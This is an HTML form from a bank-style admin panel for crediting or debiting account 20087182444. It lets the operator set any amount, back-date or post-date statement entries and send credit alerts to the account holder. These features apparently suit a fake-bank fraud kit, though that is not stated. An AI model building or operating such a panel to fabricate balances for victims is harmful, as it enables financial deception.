<div id="content"><style type="text/css">table{border-collapse:collapse; width:100%; margin-bottom:20px}table td:first-child{width:135px}th,td{padding:5px 1px;text-align:left}.tblist th{border-bottom: solid 1px #CCCCCC}.tblist td{border-bottom: dotted 1px #CCCCCC}.tblist td:last-child{font-weight:bold; text-align:right; font-size:10px}.tblist td:last-child span,.tblist td:last-child a{cursor:pointer; padding:3px 5px; border:solid 1px #CCCCCC; background-color:#000; color:#FFFFFF}.tblist td:last-child span:hover,.tblist td:last-child a:hover{background-color:#ccc; text-decoration:none}.tblist a.normal{text-decoration:none; cursor:pointer; color:#3366FF}.tblist a.normal:hover{text-decoration:underline}.tbaccdetail td:last-child{font-weight:bold}ul.nav{margin:0; padding:0; list-style:none}ul.nav li{padding-bottom:10px}.error{color:#FF0000; margin:15px 0 15px 150px; font-weight:bold}.success{color:#00CC00; margin:15px 0 15px 150px; font-weight:bold}.acc{color:#3366FF; cursor:pointer; font-weight:bold}.tbacclist td:first-child{width:20px}.top-nav{float:right; padding-top:20px; font-weight:bold; cursor:pointer}#side-right li a{font-weight:bold; text-decoration:none;}.hid{display:none}</style><h1>Credit or Debit Account</h1> <form action="" method="post"><input type="hidden" name="hpost" value="20087182444"><input type="hidden" name="accid" value="42"><input type="hidden" name="name" value=""><input type="hidden" name="email" value=""><input type="hidden" name="phone" value=""><input type="hidden" name="accbal" value="0.00"><input type="hidden" name="currency" value="$">You are about to Add/Remove funds from:<ul><li>Account Number: <b>20087182444</b></li><li>Account Holder: &nbsp;&nbsp;&nbsp;<b></b></li><li>Current Balance: &nbsp;<b>$0.00</b></li></ul><table><tbody><tr><td>I want to</td><td><input type="radio" name="intent" value="credit" onClick="$('#intent').text('to Credit');$('#alert').show()">Credit <input type="radio" name="intent" value="debit" onClick="$('#intent').text('to Debit');$('#alert').hide()">Debit</td></tr><tr><td>Amount <span id="intent"></span></td><td>$<input type="text" name="amount" value="" maxlength="20"></td></tr><tr><td valign="top">Statement Preference</td><td><input type="radio" name="statement" value="y" onClick="$('#statement').show()">Create statement <input type="radio" name="statement" value="n" onClick="$('#statement').hide()">Don't create statement<div id="statement" class="hide" style="margin-top:15px;"><b>This information will appear on the account statement and visible to account holder</b><div style="padding-top:10px; border-top: dashed 1px #CCCCCC">Transaction Date <input type="text" name="date" value="11/05/2020" maxlength="10"> <span class="f9">(You may back-date or post-date)</span><br>Description &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="desc" value="" size="70" maxlength="100"><br><div id="alert">&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="checkbox" name="alert" checked="checked"> Send Credit Alert to Account Holder</div></div></div></td></tr><tr><td>&nbsp;</td><td><input type="submit" class="btngo" value="Submit"></td></tr></tbody></table></form></div>
<?php } ?>




<div id="side-right"><ul class="nav"><li><a href="?acc">Add New Account</a></li><li><a href="home.php?list">List All Accounts</a></li><li><a href="home.php?state">Statement Center</a></li><li><a href="home.php?mail">Message Center</a></li></ul></div></div></body></html>